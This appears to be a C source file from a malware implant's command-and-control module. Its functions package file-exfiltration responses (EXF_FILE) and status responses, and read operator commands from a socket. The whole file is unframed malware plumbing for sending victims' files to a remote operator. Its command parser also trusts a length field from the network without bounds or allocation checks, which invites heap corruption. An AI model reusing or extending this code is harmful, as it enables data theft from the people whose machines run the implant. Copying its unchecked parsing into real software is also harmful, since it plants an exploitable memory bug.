#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>

#include "c2_prot.h"

struct exf_res *exf_res_init(uint32_t file_size, enum file_status status)
{
    struct exf_res *res;
    uint32_t len = sizeof(struct exf_res) + file_size;

    res = (struct exf_res *)malloc(len);
    res->header.type = EXF_FILE;
    res->header.res_len = len;
    res->content_len = file_size;
    res->status = status;

    return res;
}

struct inf_res *inf_res_init(enum file_status status)
{
    struct inf_res *res;
    uint32_t len = sizeof(struct inf_res);

    res = (struct inf_res *)malloc(len);
    res->header.type = INF_FILE;
    res->header.res_len = len;
    res->status = status;

    return res;
}

struct c2_req *receive_command(int sockfd)
{
    struct c2_req req_tmp;
    struct c2_req *req;

    if (read(sockfd, &req_tmp, sizeof(struct c2_req)) != sizeof(struct c2_req))
    {
        return NULL;
    }

    req = malloc(req_tmp.req_len);

    memset(req, 0, req_tmp.req_len);
    memcpy(req, &req_tmp, sizeof(req_tmp));

    read(sockfd, (void *)req + sizeof(struct c2_req), req->req_len - sizeof(struct c2_req));

    return req;
}
